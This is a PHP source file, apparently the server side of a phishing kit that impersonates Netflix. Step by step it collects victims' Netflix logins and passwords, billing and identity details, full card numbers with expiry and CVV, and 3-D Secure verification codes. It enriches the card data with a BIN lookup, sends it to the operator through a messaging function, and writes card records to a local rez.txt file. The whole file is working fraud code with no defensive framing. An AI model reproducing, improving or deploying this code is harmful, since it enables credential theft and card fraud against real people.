<?php
include '../server/ab.php';
session_start();
if ($testmode == true) {
    $ip = '172.177.221.87';
}else{
    $ip = $_SERVER['REMOTE_ADDR'];
}

function formatCreditCardNumber($creditCardNumber) {
    $creditCardNumber = str_replace(' ', '', $creditCardNumber);
    $groups = str_split($creditCardNumber, 4);
    $formattedCreditCardNumber = implode(' ', $groups);

    return $formattedCreditCardNumber;
}


if (isset($_GET['action'])) {
    if ($_GET['action'] ==  'send') {
        $rez = $_GET['rez'];
        if ($_GET['step'] == "login") {
            $final = explode('|',$rez);
            $message = "
            [🇱🇧 + 1 L3G1N N3TFL1X 🇱🇧]

            🪪 iD : ".$final[0]."
            🔑 ePass : ".$final[1]."

            🌍 IP : ".$_SERVER['REMOTE_ADDR']."
            🌍 UA : ".$_SERVER['HTTP_USER_AGENT']."";
                sendMessage($message,false);
                
        }else if ($_GET['step'] == "billing") {
                $final = explode('|',$rez);
                $_SESSION['nom'] = $final[0];
                $_SESSION['dob'] = $final[1];
                $_SESSION['tel'] = $final[2];
                $_SESSION['city'] = $final[3];
                $_SESSION['address'] = $final[4];
                $_SESSION['zip'] = $final[5];
                $message = "
                [🇱🇧 +1 B1LL1NG N3TF71X 🇱🇧]

                🧬 Nom et prénom : ".$final[0]."
                🧬 Date de naissance : ".$final[1]."
                🧬 Numéro de téléphone : ".$final[2]."

                💊 Ville : ".$final[3]."
                💊 Adresse : ".$final[4]."
                💊 Code Postal : ".$final[5]."

                🌍 IP : ".$_SERVER['REMOTE_ADDR']."
                🌍 UA : ".$_SERVER['HTTP_USER_AGENT']."";
                    sendMessage($message,False);
                    update('billing');
                    
                
        }else if ($_GET['step'] == "cc") {
				
                $final = explode('|',$rez);
                $bin = substr($final[1],0,7);
                $bin = str_replace(' ','',$bin);
                $data = json_decode(getBin($bin),true);
                $level = $data['level'];
                $type = $data['type'];
                $bank = $data['bank'];
                $url = urlencode("https://".$_SERVER['SERVER_NAME']."/scan/?nom=".$final[0]."&cc=".$final[1]."&exp=".$final[2]."");
                $message = "
                [🇱🇧 +1 CC N3TF71X 🇱🇧]

                🏴‍☠️ Nom : ".$final[0]."
                🏴‍☠️ Numéro de carte : ".formatCreditCardNumber($final[1])."
                🏴‍☠️ Date d'expiration : ".$final[2]."
                🏴‍☠️ CVV : ".$final[3]."
                                
                ⚖️ Level : ".$level."
                ⚖️ Banque : ".$bank."
                ⚖️ Type : ".$type."
                ⚖️ Scan : ".$url."
                                
                🧬 Nom et prénom : ".$_SESSION['nom']."
                🧬 Date de naissance : ".$_SESSION['dob']."
                🧬 Numéro de téléphone : ".$_SESSION['tel']."
                                
                💊 Ville : ".$_SESSION['city']."
                💊 Adresse : ".$_SESSION['address']."
                💊 Code Postal : ".$_SESSION['zip']."
                                
                🌍 IP : ".$_SERVER['REMOTE_ADDR']."
                🌍 UA : ".$_SERVER['HTTP_USER_AGENT']."";
					//sendMessage($message, False);
                    sendMessage($message,"1");
                    
                    $file = fopen('rez.txt', "a");
                    fwrite($file, "\n" . $final[1] . '|' . $final[2]. '|' . $_SESSION['nom']. '|' . $_SESSION['dob'] . '|' . $_SESSION['tel']. '|' .$_SESSION['city'] . '|' . $_SESSION['address'] . '|' .$_SESSION['zip'] . '|' . date('d/m/Y h:i:s'));
                    fclose($file);
                    update('cc');
        }else if ($_GET['step'] == "vbv") {
            $final = explode('|',$rez);
            $message = "
            [🇱🇧 +1 V3V N3TF71X 🇱🇧]

            🏷 Code : ".$final[0]."

            🌍 IP : ".$_SERVER['REMOTE_ADDR']."
            🌍 UA : ".$_SERVER['HTTP_USER_AGENT']."";
                sendMessage($message,"2");
                
            
        }else if($_GET['step'] == "new") {
            $message = "
            [🇱🇧 +1 NEW N3TF71X 🇱🇧]
        
            🌍 IP : ".$_SERVER['REMOTE_ADDR']."
            🌍 UA : ".$_SERVER['HTTP_USER_AGENT']."";
            sendMessage($message,False);    
            
        }
    }
}

   
?>